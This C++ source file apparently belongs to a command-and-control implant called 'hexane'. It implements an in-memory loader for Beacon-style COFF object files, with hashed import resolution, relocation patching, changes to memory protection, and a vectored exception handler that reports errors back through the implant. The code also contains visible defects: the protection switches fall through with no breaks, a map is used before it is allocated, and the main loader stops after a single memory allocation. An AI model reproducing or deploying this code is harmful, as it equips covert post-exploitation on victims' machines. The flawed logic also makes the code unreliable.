#include <core/include/objects.hpp>
namespace Objects {

    LPVOID WrapperReturn = nullptr;

    _hash_map loader_wrappers[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    _hash_map implant_wrappers[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {

        _stream *stream = Stream::CreateTaskResponse(TypeError);

        exception->ContextRecord->IP_REG = (uint64_t)(U_PTR(WrapperReturn));

        Stream::PackDword(stream, ERROR_UNHANDLED_EXCEPTION);
        Stream::PackDword(stream, exception->ExceptionRecord->ExceptionCode);
        Stream::PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));

        Dispatcher::MessageQueue(stream);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    VOID WrapperFunction(void *address, void *args, size_t size) {

        auto function = (obj_entry) address;
        WrapperReturn = __builtin_extract_return_addr(__builtin_return_address(0));

        function((char*)args, size);
    }

    BOOL ProcessSymbol(char* sym_string, void** pointer) {

        bool success    = true;
        bool import     = false;

        char *library   = { };
        char *function  = { };

        uint32_t lib_hash   = 0;
        uint32_t fn_hash    = 0;

        *pointer = nullptr;

        if (Utils::HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {
            function = sym_string + COFF_PREP_BEACON_SIZE;

            for (auto i = 0;; i++) {
                if (!implant_wrappers[i].name) {
                    break;
                }

                if (Utils::HashStringA(function, x_strlen(function)) == implant_wrappers[i].name) {
                    *pointer = implant_wrappers[i].address;
                    success_(true);
                }
            }

            success_(false);
        }
        else if (Utils::HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
            auto length = x_strlen(sym_string);

            for (auto i = COFF_PREP_SYMBOL_SIZE + 1; i < length - 1; i++) {
                if (sym_string[i] == 0x24) { // '$'
                    import = true;
                }
            }

            if (import) {
                int count   = 0;
                auto split  = x_split(S_PTR(sym_string) + COFF_PREP_SYMBOL_SIZE, S_PTR(0x24), &count);

                library     = split[0];
                function    = split[1];
#if _M_IX86
                IX86_SYM_STRIP(function);
#endif
                lib_hash   = Utils::HashStringA(library, x_strlen(library));
                fn_hash    = Utils::HashStringA(function, x_strlen(function));

                for (auto i = 0; i < count; i++) {
                    x_free(split[i]);
                }

                x_assertb(C_PTR_HASHES(*pointer, lib_hash, fn_hash));
                success_(true);
            }
            else {
                function = sym_string + COFF_PREP_SYMBOL_SIZE;
#if _M_IX86
                IX86_SYM_STRIP(function);
#endif
                fn_hash = Utils::HashStringA(function, x_strlen(function));

                for (auto i = 0;; i++) {
                    if (!loader_wrappers[i].name) {
                        break;
                    }

                    if (fn_hash == loader_wrappers[i].name) {
                        *pointer = loader_wrappers[i].address;
                        success_(true);
                    }
                }

                success_(false);
            }
        }
        else if (Utils::HashStringA(sym_string, x_strlen(sym_string)) == COFF_INSTANCE) {
            *pointer = R_CAST(_hexane*, GLOBAL_OFFSET);
            success_(true);
        }

        defer:
        return success;
    }

    BOOL ExecuteFunction(_executable *object, uint32_t function, void *args, size_t size) {
        // todo: still believe I want these functions to be pre-hashed

        void        *veh_handle = { };
        void        *entrypoint = { };
        char        *sym_name   = { };

        uint32_t    protect     = 0;
        uint32_t    bit_mask    = 0;
        uint32_t    name_hash   = 0;
        bool        success     = true;

        x_assertb(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler));

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = (IMAGE_SECTION_HEADER*) U_PTR(object->buffer) + sizeof(IMAGE_FILE_HEADER) + U_PTR(sizeof(IMAGE_SECTION_HEADER) * sec_index);

            if (object->section->SizeOfRawData > 0) {
                switch (object->section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ| IMAGE_SCN_MEM_WRITE)) {
                    case PAGE_NOACCESS:         protect = PAGE_NOACCESS;
                    case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE;
                    case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY;
                    case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY;
                    case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ;
                    case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY;
                    case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE;
                    case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE;
                    default: success_(false);
                }

                if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                    protect |= PAGE_NOCACHE;
                }

                x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &object->sec_map[sec_index].address, &object->sec_map[sec_index].size, protect, nullptr));
            }
        }

        if (object->fn_map->size) {
            x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void **) &object->fn_map->address, &object->fn_map->size, PAGE_READONLY, nullptr));
        }

        for (auto sym_index = 0; sym_index < object->nt_head->FileHeader.NumberOfSymbols; sym_index++) {
            if (object->symbol[sym_index].First.Value[0]) {
                sym_name = object->symbol[sym_index].First.Name;
            }
            else {
                sym_name = (char*)(object->symbol + object->nt_head->FileHeader.NumberOfSymbols) + object->symbol[sym_index].First.Value[1];
            }

            name_hash = Utils::HashStringA(sym_name, x_strlen(sym_name));

            if (x_memcmp(&name_hash, &function, sizeof(uint32_t)) == 0) {
                entrypoint = object->sec_map[object->symbol[sym_index].SectionNumber - 1].address + object->symbol[sym_index].Value;
                break;
            }
        }

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            if (U_PTR(entrypoint) >= SEC_START(object->sec_map, sec_index) && U_PTR(entrypoint) < SEC_END(object->sec_map, sec_index)) {

                object->section = (IMAGE_SECTION_HEADER*) object->buffer + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_SECTION_HEADER) * sec_index;
                x_assertb((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE);
            }
        }

        WrapperFunction(entrypoint, args, size);

        defer:
        if (veh_handle) {
            Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handle);
        }
        return success;
    }

    VOID Cleanup(_executable *object) {

        void    *pointer    = { };
        size_t  size        = 0;

        x_assert(object);
        x_assert(object->buffer);

        x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &object->buffer, &object->size, PAGE_READWRITE, nullptr));

        pointer = object->buffer;
        size    = object->size;

        x_ntassert(Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE));

        if (object->sec_map) {
            x_memset(object->sec_map, 0, object->nt_head->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
            x_free(object->sec_map);

            object->sec_map = nullptr;
        }

        defer:
    }

    BOOL BaseRelocation(_executable *object) {
        // todo: turns out the function names come from the binary, not a server message

        uint32_t fn_count = 0;

        void *function      = { };
        char *name_ptr      = { };
        char sym_name[9]    = { };
        bool success        = true;

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {

            object->section = (IMAGE_SECTION_HEADER *) object->buffer + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * sec_index);
            object->reloc   = (_reloc *) object->buffer + object->section->PointerToRelocations;

            for (auto rel_index = 0; rel_index < object->section->NumberOfRelocations; rel_index++) {
                _symbol *symbol = &object->symbol[object->reloc->SymbolTableIndex];

                if (symbol->First.Value[0]) {
                    x_memset(sym_name, 0, 9);
                    x_memcpy(sym_name, symbol->First.Name, 8);

                    name_ptr = sym_name;
                }
                else {
                    name_ptr = (char *) (object->symbol + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }

                void *reloc_addr  = object->sec_map[sec_index].address + object->reloc->VirtualAddress;
                void *sec_addr    = object->sec_map[symbol->SectionNumber - 1].address;
                void *fmap_addr   = object->fn_map + (fn_count * sizeof(void *));

                x_assertb(ProcessSymbol(name_ptr, &function));
#if _WIN64
                if (function) {
                    switch (object->reloc->Type) {
                        case IMAGE_REL_AMD64_REL32: {

                            *(void **) fmap_addr        = function;
                            *(uint32_t *) reloc_addr    = U_PTR(fmap_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        }
                        default:
                            break;
                    }
                } else {
                    switch (object->reloc->Type) {
                        case IMAGE_REL_AMD64_REL32:     *(uint32_t *) reloc_addr = (*(uint32_t *) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        case IMAGE_REL_AMD64_ADDR32NB:  *(uint32_t *) reloc_addr = (*(uint32_t *) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        case IMAGE_REL_AMD64_REL32_1:   *(uint32_t *) reloc_addr = (*(uint32_t *) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 1;
                        case IMAGE_REL_AMD64_REL32_2:   *(uint32_t *) reloc_addr = (*(uint32_t *) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 2;
                        case IMAGE_REL_AMD64_REL32_3:   *(uint32_t *) reloc_addr = (*(uint32_t *) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 3;
                        case IMAGE_REL_AMD64_REL32_4:   *(uint32_t *) reloc_addr = (*(uint32_t *) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 4;
                        case IMAGE_REL_AMD64_REL32_5:   *(uint32_t *) reloc_addr = (*(uint32_t *) reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 5;
                        case IMAGE_REL_AMD64_ADDR64:    *(uint64_t *) reloc_addr = (*(uint64_t *) reloc_addr) + U_PTR(sec_addr);
                        default:
                            break;
                    }
                }
#else
                if (function) {
                    switch (object->reloc->Type) {
                        case IMAGE_REL_I386_DIR32: {

                            *(void**) fmap_addr     = function;
                            *(uint32_t*)reloc_addr  = U_PTR(fmap_addr);
                        }
                        default:
                            break;
                    }
                }
                else {
                    switch (object->reloc->Type) {
                        case IMAGE_REL_I386_DIR32: *(uint32_t*)reloc_addr = (*(uint32_t*)reloc_addr) + U_PTR(sec_addr);
                        case IMAGE_REL_I386_REL32: *(uint32_t*)reloc_addr = (*(uint32_t*)reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        default:
                            break;
                    }
                }
#endif
                object->reloc = object->reloc + sizeof(_reloc);
            }
        }

        defer:
        return success;
    }

    SIZE_T GetFunctionMapSize(_executable *object) {

        char    sym_name[9] = { };
        char    *buffer     = { };
        int     counter     = 0;

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = (IMAGE_SECTION_HEADER*) object->buffer + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * sec_index);
            object->reloc   = (_reloc*) object->buffer + object->section->PointerToRelocations;

            for (auto rel_index = 0; rel_index < object->section->NumberOfRelocations; rel_index++) {
                _symbol *symbol = &object->symbol[object->reloc->SymbolTableIndex];

                if (symbol->First.Value[0]) {
                    x_memset(sym_name, 0, sizeof(sym_name));
                    x_memcpy(sym_name, symbol->First.Name, 8);

                    buffer = sym_name;
                }
                else {
                    buffer = ((char*)object->symbol + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }

                if (Utils::HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                    counter++;
                }

                object->reloc = object->reloc + sizeof(_reloc);
            }
        }

        return sizeof(void*) * counter;
    }

    VOID RemoveCoff(_executable *object) {

        _executable *prev = { };

        if (!object) {
            return;
        }

        for (auto head = Ctx->coffs; head; head = head->next) {
            if (head->task_id == object->task_id) {
                if (prev) {
                    prev->next = head->next;
                }
                else {
                    Ctx->coffs = head->next;
                }

                x_memset(object->buffer, 0, object->size);
                return;
            }

            prev = head;
        }
    }

    VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size, uint32_t task_id) {

        _executable *object = { };
        void        *next   = { };
        bool        success = true;

        x_assertb(data);

        object          = (_executable*) x_malloc(sizeof(_executable));
        object->buffer  = B_PTR(data);
        object->nt_head = NT_HEADERS(object->buffer, DOS_HEADER(object->buffer));
        object->symbol  = (_symbol*)U_PTR(object->buffer) + object->nt_head->FileHeader.PointerToSymbolTable;
        object->task_id = task_id;
        object->next    = Ctx->coffs;

        Ctx->coffs = object;

        x_assertb(Opsec::ImageCheckArch(object));
        x_assertb(object->sec_map = (_object_map*)x_malloc(sizeof(void*) * sizeof(_object_map)));
        x_assertb(object->fn_map->size = GetFunctionMapSize(object));

        for (auto sec_index = 0; sec_index < object->nt_head->FileHeader.NumberOfSections; sec_index++) {
            object->section = (IMAGE_SECTION_HEADER*) object->buffer + sizeof(IMAGE_FILE_HEADER) + (sizeof(IMAGE_SECTION_HEADER) * sec_index);
            object->size    += object->section->SizeOfRawData;
            object->size    = (size_t) U_PTR(PAGE_ALIGN(object->size));
        }

        object->size += object->fn_map->size;
        x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &object->base, NULL, &object->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

        defer:
    }
}
